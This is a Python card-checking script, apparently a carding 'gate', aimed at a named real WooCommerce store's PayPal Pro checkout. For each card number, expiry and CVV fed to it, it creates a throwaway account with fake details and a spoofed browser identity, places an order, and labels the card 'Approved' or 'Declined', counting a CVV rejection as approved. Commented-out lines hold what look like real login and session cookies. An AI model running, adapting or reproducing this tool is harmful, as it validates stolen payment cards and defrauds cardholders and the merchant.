import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

@dataclass
class payflowwo:
    def main(self, tarjeta):
        try:
            self.card = tarjeta
            self.ccs = tarjeta.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            self.session = Session()
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/shop/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; continue_url=https://polytechamerica.com/product-category/equipment-mounts/; wordpress_logged_in_e78bf33fc09f0756f504705b09d56197=banes42563%7C1777782927%7C57TvMkrU9ldf1vtrVtmAZ8QMWc1K5FXhOtQVQHWZV2X%7C680425a27da3770253f81a6a78354112faf8a69bcd8491b673b70f7e24239133; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=2045%7C1777178127%7C1776659727%7C%24generic%249-E6f-r_kn6SK5UsJGqOfISJ11R0WqhvWBisaxrL; wfwaf-authcookie-9e27a8ac6a75bbd253dc982e0c265df6=2045%7Cother%7Cread%7C455bc29035b02f012918ec2dbfe800be02db092c025bf916b74443fdd8a0b322; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; sbjs_session=pgs%3D36%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Ftractel-grip-hoist%2F',
            }

            response = self.session.get('https://polytechamerica.com/product/tractel-grip-hoist/', headers=headers)

            response = self.session.post(
                "https://polytechamerica.com/product/tractel-grip-hoist/",
                data={
                    "quantity": "1",
                    "add-to-cart": "10675"
                },
                headers={
                    "user-agent": Agent,
                    "referer": "https://polytechamerica.com/product/tractel-grip-hoist/"
                }
            )
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/product/tractel-grip-hoist/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; wordpress_logged_in_e78bf33fc09f0756f504705b09d56197=banes42563%7C1777782927%7C57TvMkrU9ldf1vtrVtmAZ8QMWc1K5FXhOtQVQHWZV2X%7C680425a27da3770253f81a6a78354112faf8a69bcd8491b673b70f7e24239133; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=2045%7C1777178127%7C1776659727%7C%24generic%249-E6f-r_kn6SK5UsJGqOfISJ11R0WqhvWBisaxrL; wfwaf-authcookie-9e27a8ac6a75bbd253dc982e0c265df6=2045%7Cother%7Cread%7C455bc29035b02f012918ec2dbfe800be02db092c025bf916b74443fdd8a0b322; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; woocommerce_items_in_cart=1; woocommerce_cart_hash=870f252df32a17c8b214a4afe862933a; sbjs_session=pgs%3D38%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Ftractel-grip-hoist%2F',
            }

            response = self.session.get('https://polytechamerica.com/cart/', headers=headers)
            match = re.search(
                r'name="woocommerce-cart-nonce"\s+value="([^"]+)"',
                response.text
            )

            cart_nonce = match.group(1)
            print(cart_nonce)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/cart/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; woocommerce_cart_hash=2d4faf3847b0cb5ca3c90f09284b748b; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=t_3a254513b307b8a4d86249608b7e6e%7C1776748822%7C1776662422%7C%24generic%24NxWBIT2fc7_Dp8h8GYAY9De-fPfEiI3uRyHOO_8A; sbjs_session=pgs%3D44%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fcart%2F',
            }

            response = self.session.get('https://polytechamerica.com/checkout/', headers=headers)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/cart/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; woocommerce_cart_hash=2d4faf3847b0cb5ca3c90f09284b748b; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=t_3a254513b307b8a4d86249608b7e6e%7C1776748822%7C1776662422%7C%24generic%24NxWBIT2fc7_Dp8h8GYAY9De-fPfEiI3uRyHOO_8A; sbjs_session=pgs%3D44%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fcart%2F',
            }

            params = {
                'redirect': 'https://polytechamerica.com/checkout',
            }

            response = self.session.get('https://polytechamerica.com/my-account/', params=params, headers=headers)
            match = re.search(
                r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                response.text
            )

            register_nonce = match.group(1)
            print(register_nonce)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://polytechamerica.com',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/my-account/?redirect=https%3A%2F%2Fpolytechamerica.com%2Fcheckout',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; woocommerce_cart_hash=2d4faf3847b0cb5ca3c90f09284b748b; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=t_3a254513b307b8a4d86249608b7e6e%7C1776748822%7C1776662422%7C%24generic%24NxWBIT2fc7_Dp8h8GYAY9De-fPfEiI3uRyHOO_8A; sbjs_session=pgs%3D45%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fmy-account%2F%3Fredirect%3Dhttps%253A%252F%252Fpolytechamerica.com%252Fcheckout',
            }

            params = {
                'redirect': 'https://polytechamerica.com/checkout',
            }

            data = {
                'email': CorreoRand,
                'password': 'leito132asd',
                'billing_first_name': 'ldfl',
                'billing_last_name': 'dsdasd',
                'billing_company': 'ggd',
                'billing_contact_email': CorreoRand,
                'billing_country': 'US',
                'billing_address_1': 'moall del sol',
                'billing_address_2': 'sadw',
                'billing_postcode': '10080',
                'billing_city': 'Manhattan',
                'billing_state': 'NY',
                'billing_phone': '+10989861371',
                'billing_landline_phone': '',
                'ups_account_number': '',
                'ups_account_zipcode': '',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://polytechamerica.com/product/extension-cord-organizer/',
                'wc_order_attribution_session_start_time': '2026-04-19 04:31:54',
                'wc_order_attribution_session_pages': '45',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': Agent,
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/?redirect=https%3A%2F%2Fpolytechamerica.com%2Fcheckout',
                'register': 'Register',
                'redirect': 'https://polytechamerica.com/checkout',
            }

            response = self.session.post('https://polytechamerica.com/my-account/', params=params,  headers=headers, data=data)
                
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.6',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://polytechamerica.com/my-account/?redirect=https%3A%2F%2Fpolytechamerica.com%2Fcheckout',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; woocommerce_cart_hash=2d4faf3847b0cb5ca3c90f09284b748b; sbjs_session=pgs%3D45%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fmy-account%2F%3Fredirect%3Dhttps%253A%252F%252Fpolytechamerica.com%252Fcheckout; wordpress_logged_in_e78bf33fc09f0756f504705b09d56197=bane221s42563%7C1777785874%7CjjS3Zx1Kx0NXAmCP4Gyn9sQAVTFTTyTLBmoou2kKLjC%7C7be9fb9cc693dce543d4ff4a6a5327ef9f5ac8e8a2ed7f8df27584b148517187; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=2046%7C1777181074%7C1776662674%7C%24generic%24r2KCIL9muQBqVi2g5Zyhs2vonSryfZBWyMWBviBT; wfwaf-authcookie-9e27a8ac6a75bbd253dc982e0c265df6=2046%7Cother%7Cread%7C03d2b76d605799a01514b09887f73c934478d43b3056fe404f46cbcca6551a36',
            }

            response = self.session.get('https://polytechamerica.com/checkout/', headers=headers)
            match = re.search(
                r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"',
                response.text
            )

            checkout_nonce = match.group(1)
            print(checkout_nonce)
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.6',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://polytechamerica.com',
                'priority': 'u=1, i',
                'referer': 'https://polytechamerica.com/checkout/',
                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Brave";v="146"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': Agent,
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-04-19%2004%3A31%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F146.0.0.0%20Safari%2F537.36; woocommerce_recently_viewed=1091%7C890%7C1096%7C1093%7C3418%7C1104%7C353%7C3474%7C10675; continue_url=https://polytechamerica.com/product-category/uncategorized/; wordpress_test_cookie=WP%20Cookie%20check; woocommerce_items_in_cart=1; wordpress_logged_in_e78bf33fc09f0756f504705b09d56197=bane221s42563%7C1777785874%7CjjS3Zx1Kx0NXAmCP4Gyn9sQAVTFTTyTLBmoou2kKLjC%7C7be9fb9cc693dce543d4ff4a6a5327ef9f5ac8e8a2ed7f8df27584b148517187; wp_woocommerce_session_e78bf33fc09f0756f504705b09d56197=2046%7C1777181074%7C1776662674%7C%24generic%24r2KCIL9muQBqVi2g5Zyhs2vonSryfZBWyMWBviBT; wfwaf-authcookie-9e27a8ac6a75bbd253dc982e0c265df6=2046%7Cother%7Cread%7C03d2b76d605799a01514b09887f73c934478d43b3056fe404f46cbcca6551a36; sbjs_session=pgs%3D46%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpolytechamerica.com%2Fcheckout%2F; woocommerce_cart_hash=870f252df32a17c8b214a4afe862933a',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpolytechamerica.com%2Fproduct%2Fextension-cord-organizer%2F&wc_order_attribution_session_start_time=2026-04-19+04%3A31%3A54&wc_order_attribution_session_pages=46&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F146.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_email={CorreoRand}&billing_last_name=dsdasd&billing_company=ggd&billing_contact_email={CorreoRand}&billing_country=US&billing_address_1=128+Blacks+Road&billing_address_2=sadw&billing_postcode=06410&billing_city=Cheshire&billing_state=CT&billing_phone=%2B10989861371&billing_landline_phone=&ups_account_number=&ups_account_zipcode=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=wf_shipping_ups%3A03&payment_method=paypalpro&billing_credircard={self.ccs[0]}&billing_cardtype=Visa&billing_expdatemonth={self.ccs[1]}&billing_expdateyear={self.ccs[2]}&billing_ccvnumber={self.ccs[3]}&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

            response = self.session.post('https://polytechamerica.com/', params=params, headers=headers, data=data).text
            err = paserX(response, 'class=\\"woocommerce-error\\" role=\\"alert\\">\\n\\t\\t\\t<li>\\n\\t\\t\\t', '\\t\\t<\\/li>\\n\\t\\t\\t<li>\\n\\t\\t\\t(Transaction Error) something is wrong.\\t\\t<\\/li>\\n\\t<\\/ul>\\n')
            print(err)
            #payflow woo 18.08
            if '"result":"success' in response: return 'Approved! ✅', None
            elif 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in err: return 'Approved! ✅', err
            else:return 'Declined ❌', err
        except: return 'error gate Declined ❌'